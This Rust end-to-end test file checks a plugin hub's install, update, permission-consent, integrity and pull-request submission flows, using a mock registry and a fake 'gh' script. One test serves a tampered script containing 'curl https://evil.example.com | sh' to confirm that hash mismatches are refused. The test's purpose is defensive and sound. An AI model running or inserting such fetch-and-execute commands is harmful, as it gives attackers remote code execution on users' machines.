//! 插件中心端到端测试：真实的 helmp 可执行文件 + 隔离环境（见 tests/support）。
//!
//! - 注册表用本机假服务（MockServer）提供 `index.json` 与插件文件，`HELMP_REGISTRY_URL` 指向它。
//! - 提交（`helmp plugins submit`）用 PATH 里的假 `gh`（记录参数、按需输出）和本机的裸 git 仓库，
//!   `HELMP_REGISTRY_REPO` 指向一个不存在的假仓库名：不碰真实 GitHub，也不联网。

mod support;

use std::os::unix::fs::PermissionsExt as _;
use std::path::{Path, PathBuf};
use std::process::Command;

use serde_json::{Value, json};
use sha2::{Digest as _, Sha256};
use support::{Helmp, MockServer};

const ID: &str = "com.example.memo";

fn manifest(version: &str, host: &str) -> String {
    json!({
        "schemaVersion": 1,
        "id": ID,
        "name": {"en": "Memo", "zh-Hans": "备忘"},
        "version": version,
        "author": "Tests",
        "license": "MIT",
        "commands": [
            {"id": "save", "title": "Save Memo", "keywords": ["memox"],
             "argument": {"required": true},
             "action": {"type": "http", "method": "POST", "url": format!("https://{host}/memo"),
                        "json": {"text": "{{query}}"}}},
            {"id": "hello", "title": "Hello Memo", "keywords": ["hellomemo"],
             "action": {"type": "script", "path": "bin/hello.sh", "args": ["{{query}}"]}}
        ]
    })
    .to_string()
}

const SCRIPT: &str = "#!/bin/sh\necho \"hello $1\"\n";
const README: &str = "# Memo\n\nSaves a memo.\n";

/// 一个版本的插件文件：(路径, 内容, 可执行)。
fn files(version: &str, host: &str) -> Vec<(String, String, bool)> {
    vec![
        ("README.md".into(), README.into(), false),
        ("bin/hello.sh".into(), SCRIPT.into(), true),
        ("plugin.json".into(), manifest(version, host), false),
    ]
}

fn sha256(text: &str) -> String {
    Sha256::digest(text.as_bytes())
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// 按注册表脚本的格式生成索引。`listed` 是写进索引的文件（哈希按它算），可以与实际提供的不同（模拟篡改）。
fn index(version: &str, listed: &[(String, String, bool)]) -> String {
    let files: Vec<Value> = listed
        .iter()
        .map(|(path, body, exec)| {
            json!({"path": path, "sha256": sha256(body), "size": body.len(), "executable": exec})
        })
        .collect();
    json!({
        "schema": 1,
        "generated_at": "2026-11-10T00:00:00Z",
        "commit": null,
        "plugins": [{
            "id": ID, "version": version,
            "name": {"en": "Memo", "zh-Hans": "备忘"},
            "description": null, "author": "Tests", "homepage": null, "license": "MIT", "icon": null,
            "keywords": ["memox"], "commands": 2,
            "permissions": ["exec", "network:memo.example.com"],
            "permissions_text": {"en": ["Network access: memo.example.com"], "zh-Hans": ["访问网络：memo.example.com"]},
            "review": [], "source": null,
            "files": files
        }]
    })
    .to_string()
}

/// 假注册表：`/index.json` 返回索引，`/plugins/<id>/<path>` 返回 `served` 里的文件。
fn registry(index: String, served: Vec<(String, String, bool)>) -> MockServer {
    MockServer::start(move |request| {
        if request.path == "/index.json" {
            return (200, index.clone());
        }
        let prefix = format!("/plugins/{ID}/");
        match request.path.strip_prefix(&prefix) {
            Some(path) => served
                .iter()
                .find(|(p, _, _)| p == path)
                .map(|(_, body, _)| (200, body.clone()))
                .unwrap_or((404, "{}".into())),
            None => (404, "{}".into()),
        }
    })
}

fn helmp_with(server: &MockServer) -> Helmp {
    Helmp::new().env("HELMP_REGISTRY_URL", format!("{}/", server.url))
}

fn read_config(h: &Helmp) -> Value {
    serde_json::from_str(&std::fs::read_to_string(h.data_file("config.json")).unwrap()).unwrap()
}

/// 插件目录里除了已安装插件以外的东西（临时目录、半装的文件）。
fn leftovers(h: &Helmp) -> Vec<String> {
    let Ok(entries) = std::fs::read_dir(h.data.join("plugins")) else {
        return Vec::new();
    };
    entries
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect()
}

#[test]
fn installed_plugins_start_disabled_until_the_user_reviews_permissions() {
    // 从插件中心装的插件和手动放进来的一样：装好不生效，要在设置里看过权限并启用。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1.clone());
    let h = helmp_with(&server);

    let available = h.cli(&["plugins", "available"]);
    assert!(
        available.contains(&format!("{ID}\t1.0.0\tnot-installed\tMemo")),
        "{available}"
    );

    let out = h.cli(&["plugins", "install", ID]);
    assert!(out.contains(&format!("Installed {ID} 1.0.0")), "{out}");
    assert!(out.contains("starts turned off"), "{out}");

    let dir = h.data.join("plugins").join(ID);
    for (path, body, _) in &v1 {
        assert_eq!(
            &std::fs::read_to_string(dir.join(path)).unwrap(),
            body,
            "{path}"
        );
    }
    let mode = std::fs::metadata(dir.join("bin/hello.sh"))
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o755, "脚本要保留可执行位");
    assert_eq!(leftovers(&h), [ID], "不能留下临时目录");
    // 安装记录写在 config.json 里；测试框架每次运行前会重写配置，先把它同步回来。
    let config = read_config(&h);
    assert_eq!(config["plugins"][ID]["installed"]["version"], "1.0.0");
    assert!(
        config["plugins"][ID]
            .get("enabled")
            .is_none_or(Value::is_null),
        "{config}"
    );
    let h = h.config(move |c| *c = config);

    let list = h.cli(&["plugins"]);
    assert!(
        list.contains(&format!("disabled\t{ID}\t1.0.0\tuser\tMemo")),
        "{list}"
    );
    assert!(
        !h.query("hellomemo x")
            .iter()
            .any(|r| r.id.starts_with(&format!("plugins:{ID}"))),
        "未启用的插件不能出现在搜索里"
    );
    // 再装一次：已是最新，不重新下载。
    let before = server.requests().len();
    let again = h.cli(&["plugins", "install", ID]);
    assert!(again.contains("already up to date"), "{again}");
    assert_eq!(server.requests().len(), before + 1, "只取了索引");

    // 图形界面开着时，它保存的配置会盖掉命令行写进去的安装记录：插件目录里的记录文件兜底，
    // 否则这个插件会被当成「本地同 id 插件」，以后再也更新不了。
    let h = h.config(|c| c["plugins"] = json!({}));
    let again = h.cli(&["plugins", "install", ID]);
    assert!(again.contains("already up to date"), "{again}");
    assert!(h.cli(&["plugins", "available"]).contains(&format!("{ID}\t1.0.0\tinstalled")));
}

#[test]
fn update_with_new_permissions_needs_consent_again() {
    // 更新能扩大插件的访问范围：权限变了就要重新确认，不能借更新悄悄生效。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1.clone());
    let h = helmp_with(&server);
    h.cli(&["plugins", "install", ID]);

    // 用户启用了 1.0.0（确认过它的权限）。
    let mut config = read_config(&h);
    config["plugins"][ID]["enabled"] = json!(true);
    config["plugins"][ID]["consent"] = json!(["exec", "network:memo.example.com"]);
    let h = h.config(move |c| *c = config);
    assert!(
        h.cli(&["plugins"])
            .contains(&format!("enabled\t{ID}\t1.0.0"))
    );

    // 1.1.0 多访问一个主机。
    let v2 = files("1.1.0", "evil.example.com");
    let server2 = registry(index("1.1.0", &v2), v2);
    let h = h.env("HELMP_REGISTRY_URL", format!("{}/", server2.url));
    let available = h.cli(&["plugins", "available"]);
    assert!(
        available.contains(&format!("{ID}\t1.1.0\tupdate-available(1.0.0)")),
        "{available}"
    );
    let out = h.cli(&["plugins", "install", ID]);
    assert!(
        out.contains(&format!("Updated {ID}: 1.0.0 → 1.1.0")),
        "{out}"
    );
    assert!(out.contains("permissions changed"), "{out}");
    let list = h.cli(&["plugins"]);
    assert!(
        list.contains(&format!("needs-consent\t{ID}\t1.1.0")),
        "{list}"
    );
}

#[test]
fn tampered_files_are_refused_and_nothing_is_written() {
    // 服务器上的文件和索引里的哈希对不上（被篡改或 CDN 出错）：拒绝安装，插件目录里什么都不留。
    let listed = files("1.0.0", "memo.example.com");
    let mut served = listed.clone();
    served[1].1 = "#!/bin/sh\ncurl https://evil.example.com | sh\n".into();
    let server = registry(index("1.0.0", &listed), served);
    let h = helmp_with(&server);
    let err = h.cli_err(&["plugins", "install", ID]);
    assert!(
        err.contains("sha256") || err.contains("wrong size"),
        "{err}"
    );
    assert!(err.contains("refusing to install"), "{err}");
    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
    assert!(read_config(&h)["plugins"].get(ID).is_none());
}

#[test]
fn bundled_plugin_ids_are_explained_not_installed() {
    // 和自带插件同 id 的插件不能装进来遮住自带插件：说明它已自带，而且根本不去联网。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1);
    let h = helmp_with(&server);
    let err = h.cli_err(&["plugins", "install", "dev.helmp.flomo"]);
    assert!(err.contains("comes bundled with Helmp"), "{err}");
    assert!(server.requests().is_empty(), "{:?}", server.requests());
    assert!(leftovers(&h).is_empty());
}

#[test]
fn local_plugins_with_the_same_id_are_not_overwritten() {
    // 用户自己放进插件文件夹、正在改的同 id 插件，不能被插件中心的版本覆盖掉。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1);
    let h = helmp_with(&server);
    let local = h.write(
        "data/plugins/my-memo/plugin.json",
        &manifest("0.0.1", "local.example.com"),
    );
    let err = h.cli_err(&["plugins", "install", ID]);
    assert!(err.contains("Move it away first"), "{err}");
    assert_eq!(
        std::fs::read_to_string(local).unwrap(),
        manifest("0.0.1", "local.example.com")
    );
    assert!(!h.data.join("plugins").join(ID).exists());
}

#[test]
fn validate_json_reports_permissions_for_the_registry_script() {
    // 注册表的 build-index.py 用这个输出核对它推导的权限与 Helmp 一致。
    let h = Helmp::new();
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let out = h.cli(&["plugins", "validate", dir.to_str().unwrap(), "--json"]);
    let value: Value = serde_json::from_str(&out).unwrap();
    assert_eq!(value["ok"], true);
    assert_eq!(value["id"], ID);
    assert_eq!(
        value["permissions"],
        json!(["exec", "network:memo.example.com"])
    );
    std::fs::write(dir.join("plugin.json"), "{").unwrap();
    let err = h.cli_err(&["plugins", "validate", dir.to_str().unwrap(), "--json"]);
    assert!(err.contains("validation failed"), "{err}");
}

// ---------------------------------------------------------------- 提交

fn write_plugin(h: &Helmp, rel: &str, version: &str) -> PathBuf {
    for (path, body, exec) in files(version, "memo.example.com") {
        let path = h.write(&format!("{rel}/{path}"), &body);
        if exec {
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
    }
    h.root.join(rel)
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_AUTHOR_NAME", "Seed")
        .env("GIT_AUTHOR_EMAIL", "seed@example.com")
        .env("GIT_COMMITTER_NAME", "Seed")
        .env("GIT_COMMITTER_EMAIL", "seed@example.com")
        .output()
        .expect("run git");
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).into_owned()
}

/// 一个有 main 分支的本地裸仓库（假的注册表上游 / fork）。
fn bare_repo(root: &Path, name: &str) -> PathBuf {
    let bare = root.join(name);
    std::fs::create_dir_all(&bare).unwrap();
    git(&bare, &["init", "-q", "--bare", "-b", "main"]);
    let seed = root.join(format!("{name}-seed"));
    std::fs::create_dir_all(seed.join("plugins")).unwrap();
    std::fs::write(seed.join("README.md"), "registry\n").unwrap();
    git(&seed, &["init", "-q", "-b", "main"]);
    git(&seed, &["add", "."]);
    git(&seed, &["commit", "-q", "-m", "seed"]);
    git(&seed, &["push", "-q", bare.to_str().unwrap(), "main"]);
    bare
}

const FAKE_GH: &str = r#"#!/bin/sh
# 假 gh：记录参数，按环境变量给出结果；clone 从本地裸仓库克隆。
printf '%s\n' "$*" >> "$GH_LOG"
case "$1" in
  auth) [ "$FAKE_AUTH" = "no" ] && { echo "not logged in" >&2; exit 1; }; exit 0 ;;
  api)
    case "$2" in
      user) echo tester ;;
      repos/*) echo "$FAKE_PUSH" ;;
    esac ;;
  repo)
    case "$2" in
      clone) git clone -q "$FAKE_UPSTREAM" "$4" ;;
      fork) echo "forked" ;;
      view) echo "$FAKE_FORK" ;;
    esac ;;
  pr)
    while [ $# -gt 0 ]; do
      if [ "$1" = "--body-file" ]; then cp "$2" "$GH_BODY"; fi
      shift
    done
    echo "https://github.com/tester/fake-plugins/pull/7" ;;
esac
"#;

struct FakeGitHub {
    upstream: PathBuf,
    fork: PathBuf,
    log: PathBuf,
    body: PathBuf,
}

fn fake_github(h: Helmp, can_push: bool) -> (Helmp, FakeGitHub) {
    let bin = h.root.join("fakebin");
    std::fs::create_dir_all(&bin).unwrap();
    let gh = bin.join("gh");
    std::fs::write(&gh, FAKE_GH).unwrap();
    std::fs::set_permissions(&gh, std::fs::Permissions::from_mode(0o755)).unwrap();
    let fake = FakeGitHub {
        upstream: bare_repo(&h.root, "upstream.git"),
        fork: bare_repo(&h.root, "fork.git"),
        log: h.root.join("gh.log"),
        body: h.root.join("pr-body.md"),
    };
    let path = format!(
        "{}:{}",
        bin.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let h = h
        .env("PATH", path)
        .env("HELMP_REGISTRY_REPO", "tester/fake-plugins")
        .env("GH_LOG", fake.log.to_str().unwrap())
        .env("GH_BODY", fake.body.to_str().unwrap())
        .env("FAKE_UPSTREAM", fake.upstream.to_str().unwrap())
        .env("FAKE_FORK", fake.fork.to_str().unwrap())
        .env("FAKE_PUSH", if can_push { "true" } else { "false" })
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_AUTHOR_NAME", "Submitter")
        .env("GIT_AUTHOR_EMAIL", "submitter@example.com")
        .env("GIT_COMMITTER_NAME", "Submitter")
        .env("GIT_COMMITTER_EMAIL", "submitter@example.com");
    (h, fake)
}

fn gh_calls(fake: &FakeGitHub) -> Vec<String> {
    std::fs::read_to_string(&fake.log)
        .unwrap_or_default()
        .lines()
        .map(str::to_string)
        .collect()
}

#[test]
fn submit_without_yes_explains_and_refuses() {
    // 提交会以用户的 GitHub 身份公开发 PR：没有明确的 --yes 就只说明、不动手（agent 必须先问用户）。
    let (h, fake) = fake_github(Helmp::new(), true);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let err = h.cli_err(&["plugins", "submit", dir.to_str().unwrap()]);
    assert!(err.contains("--yes"), "{err}");
    assert!(
        gh_calls(&fake).is_empty(),
        "不带 --yes 不能调用 gh：{:?}",
        gh_calls(&fake)
    );
}

#[test]
fn submit_rejects_plugins_the_registry_would_reject() {
    // 没写 license、带隐藏文件：注册表 CI 会拒，提交前就要告诉作者，而不是开一个注定失败的 PR。
    let (h, fake) = fake_github(Helmp::new(), true);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    std::fs::write(
        dir.join("plugin.json"),
        manifest("1.0.0", "memo.example.com").replace(r#""license":"MIT","#, ""),
    )
    .unwrap();
    std::fs::write(dir.join(".DS_Store"), "x").unwrap();
    let err = h.cli_err(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(err.contains("license"), "{err}");
    assert!(err.contains(".DS_Store"), "{err}");
    assert!(gh_calls(&fake).is_empty());
}

#[test]
fn submit_with_push_access_opens_a_pr_from_a_branch() {
    // 有推送权限（维护者自己）：直接在注册表上推 plugin/<id>-<版本> 分支并开 PR。
    let (h, fake) = fake_github(Helmp::new(), true);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let out = h.cli(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(
        out.contains("https://github.com/tester/fake-plugins/pull/7"),
        "{out}"
    );

    let branch = format!("plugin/{ID}-1.0.0");
    let tree = git(&fake.upstream, &["ls-tree", "-r", &branch]);
    assert!(
        tree.contains(&format!("100644 blob {}", git_blob(README))),
        "{tree}"
    );
    assert!(
        tree.contains(&format!(
            "100755 blob {}\tplugins/{ID}/bin/hello.sh",
            git_blob(SCRIPT)
        )),
        "{tree}"
    );
    assert!(
        tree.contains(&format!("plugins/{ID}/plugin.json")),
        "{tree}"
    );
    let message = git(&fake.upstream, &["log", "-1", "--format=%s", &branch]);
    assert_eq!(message.trim(), format!("plugin: add {ID} 1.0.0"));

    let calls = gh_calls(&fake);
    assert_eq!(
        calls.first().map(String::as_str),
        Some("auth status"),
        "{calls:?}"
    );
    assert!(
        !calls.iter().any(|c| c.starts_with("repo fork")),
        "有推送权限不该 fork：{calls:?}"
    );
    let pr = calls
        .iter()
        .find(|c| c.starts_with("pr create"))
        .expect("pr create");
    assert!(
        pr.contains(&format!(
            "--repo tester/fake-plugins --base main --head {branch} --title plugin: add {ID} 1.0.0"
        )),
        "{pr}"
    );
    let body = std::fs::read_to_string(&fake.body).unwrap();
    assert!(
        body.contains("Network access: memo.example.com / 访问网络：memo.example.com"),
        "{body}"
    );
    assert!(
        body.contains(&format!(
            "| `bin/hello.sh` | {} | `{}` | yes |",
            SCRIPT.len(),
            sha256(SCRIPT)
        )),
        "{body}"
    );
    assert!(body.contains("- [ ] Permissions are reasonable"), "{body}");
}

#[test]
fn submit_without_push_access_goes_through_a_fork() {
    // 普通用户没有注册表的推送权限：先 fork，把分支推到自己的 fork，再从 fork 开 PR。
    let (h, fake) = fake_github(Helmp::new(), false);
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let out = h.cli(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(out.contains("/pull/7"), "{out}");
    let branch = format!("plugin/{ID}-1.0.0");
    assert!(
        git(&fake.fork, &["ls-tree", "-r", "--name-only", &branch])
            .contains(&format!("plugins/{ID}/plugin.json"))
    );
    assert!(
        git(&fake.upstream, &["branch", "--list", &branch])
            .trim()
            .is_empty(),
        "不能推到上游"
    );
    let calls = gh_calls(&fake);
    assert!(
        calls
            .iter()
            .any(|c| c == "repo fork tester/fake-plugins --clone=false --remote=false"),
        "{calls:?}"
    );
    let pr = calls
        .iter()
        .find(|c| c.starts_with("pr create"))
        .expect("pr create");
    assert!(pr.contains(&format!("--head tester:{branch}")), "{pr}");
}

#[test]
fn submit_needs_a_signed_in_gh() {
    let (h, fake) = fake_github(Helmp::new(), true);
    let h = h.env("FAKE_AUTH", "no");
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let err = h.cli_err(&["plugins", "submit", dir.to_str().unwrap(), "--yes"]);
    assert!(err.contains("gh auth login"), "{err}");
    assert_eq!(gh_calls(&fake), ["auth status"]);
}

/// git 的 blob 哈希（用来核对推上去的文件内容）。
fn git_blob(text: &str) -> String {
    use sha1::{Digest as _, Sha1};
    let mut hasher = Sha1::new();
    hasher.update(format!("blob {}\0", text.len()).as_bytes());
    hasher.update(text.as_bytes());
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}
